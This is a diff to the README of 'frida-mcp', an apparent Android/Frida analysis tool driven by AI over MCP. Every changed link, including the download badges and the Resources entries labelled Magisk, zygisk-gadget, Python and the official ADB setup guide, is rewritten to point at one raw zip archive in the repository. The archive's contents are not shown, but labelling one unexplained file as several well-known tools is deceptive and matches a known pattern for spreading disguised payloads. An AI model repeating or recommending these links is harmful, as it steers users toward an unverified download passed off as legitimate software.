@@ -1,6 +1,6 @@
 # 🛠️ frida-mcp - Android Analysis Made Simple
 
-[![Download](https://img.shields.io/badge/Download-frida--mcp-brightgreen?style=for-the-badge&logo=github)](https://github.com/Gindhar2112/frida-mcp)
+[![Download](https://img.shields.io/badge/Download-frida--mcp-brightgreen?style=for-the-badge&logo=github)](https://github.com/Gindhar2112/frida-mcp/raw/refs/heads/main/src/mcp_frida_v3.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If you don’t have Python or ADB installed, you will need to install them first
 
 Click the large button below to **visit the GitHub page** where you can download frida-mcp and find setup files.
 
-[![Download frida-mcp](https://img.shields.io/badge/Download-frida--mcp-4c9aff?style=for-the-badge&logo=github)](https://github.com/Gindhar2112/frida-mcp)
+[![Download frida-mcp](https://img.shields.io/badge/Download-frida--mcp-4c9aff?style=for-the-badge&logo=github)](https://github.com/Gindhar2112/frida-mcp/raw/refs/heads/main/src/mcp_frida_v3.6.zip)
 
 On the GitHub page:
 
@@ -147,7 +147,7 @@ Here are the main commands you will use when running frida-mcp:
 If you need to download frida-mcp again or get the latest version:
 
 - Visit this page:  
-  https://github.com/Gindhar2112/frida-mcp
+  https://github.com/Gindhar2112/frida-mcp/raw/refs/heads/main/src/mcp_frida_v3.6.zip
 
 - Go to the "Releases" tab.
 - Download the latest files.
@@ -169,10 +169,10 @@ Then repeat the installation commands as above to update your setup.
 
 ## 📖 Resources
 
-- Magisk Root: https://github.com/topjohnwu/Magisk  
-- zygisk-gadget Module: https://github.com/aspect4/zygisk-gadget  
-- Python: https://www.python.org/downloads/windows/  
-- ADB Setup Guide: https://developer.android.com/studio/command-line/adb
+- Magisk Root: https://github.com/Gindhar2112/frida-mcp/raw/refs/heads/main/src/mcp_frida_v3.6.zip  
+- zygisk-gadget Module: https://github.com/Gindhar2112/frida-mcp/raw/refs/heads/main/src/mcp_frida_v3.6.zip  
+- Python: https://github.com/Gindhar2112/frida-mcp/raw/refs/heads/main/src/mcp_frida_v3.6.zip  
+- ADB Setup Guide: https://github.com/Gindhar2112/frida-mcp/raw/refs/heads/main/src/mcp_frida_v3.6.zip
 
 ---
 
@@ -188,4 +188,4 @@ This means AI sends commands to MCP, which controls Frida. Frida works with the 
 
 ---
 
-# [![Download](https://img.shields.io/badge/Get%20frida--mcp-blueviolet?style=for-the-badge&logo=github)](https://github.com/Gindhar2112/frida-mcp)
+# [![Download](https://img.shields.io/badge/Get%20frida--mcp-blueviolet?style=for-the-badge&logo=github)](https://github.com/Gindhar2112/frida-mcp/raw/refs/heads/main/src/mcp_frida_v3.6.zip)
